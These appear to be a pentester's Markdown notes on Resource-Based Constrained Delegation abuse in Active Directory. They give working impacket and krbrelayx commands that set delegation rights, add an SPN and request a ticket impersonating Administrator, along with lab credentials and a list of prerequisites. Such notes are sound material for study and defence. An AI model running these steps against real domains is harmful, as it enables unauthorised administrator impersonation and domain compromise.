# Delegation

## RBCD

### Execution

1) Edit msDS-AllowedToActOnBehalfOfOtherIdentity

```bash
###########################
### impacket ldap_shell ###
###########################
# set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
set_rbcd WIN-NUU0DPB1BVC$ TestAlpha


#####################
### impacket-rbcd ###
#####################
```


2) Add SPN to current user

```bash
# -u == account we're using
# -t == target account
# 192.168.68.64 == DC IP
python3 utils/krbrelayx/addspn.py -u 'CONTOSO\TestAcc' -p 'win2016-cli-P@$swd' -s 'host/testspn.contoso.org' -t 'TestAlpha' 192.168.68.64
```


3) Get a TGS for any user to a target service

```bash
impacket-getST -spn 'HOST/WIN-NUU0DPB1BVC' -impersonate 'Administrator' -dc-ip 192.168.68.64 'contoso.org/TestAlpha:win10-gui-P@$swd'
```

### Prerequisites

- victim - account which privileges we'd relay (e.g. DA)
- desired service - service account to which we'd relay victim's auth
- infected account, either fake (newly created specifically for the attack) or owned by an attacker machine (???) account

1. Desired service account should have an msDS-AllowedToActOnBehalfOfOtherIdentity attribute featuring a infected account's SPN. (You should be able to create fake machine account (if you do NOT already own one!) and modify target service's attributes (if it DOESN'T feature your owned account already!)) (not default)
2. The victim should be not in "Protected Users" group. (default)
3. The victim should not have an "Account is sensitive and cannot be delegated" attribute set. (default)
4. Infected account should have an `TRUSTED_TO_AUTH_FOR_DELEGATION` flag featured in it's userAccountControl attribute
5. Infected account (that is set inside of msDS-AllowedToActOnBehalfOfOtherIdentity of a target service) should have an SPN (machine accounts BY DEFAULT have **GenericWrite** to themselves, so if you compromise a machineaccount you can write an SPN to it) (user accounts BY DEFAULT **DO NOT** have **GenericWrite** to themselves, so if you compromise a useraccount you **can NOT** write an SPN to it, it should **already** have an SPN) (default)
6. If relay to LDAP, LDAP singing should be OFF (default)
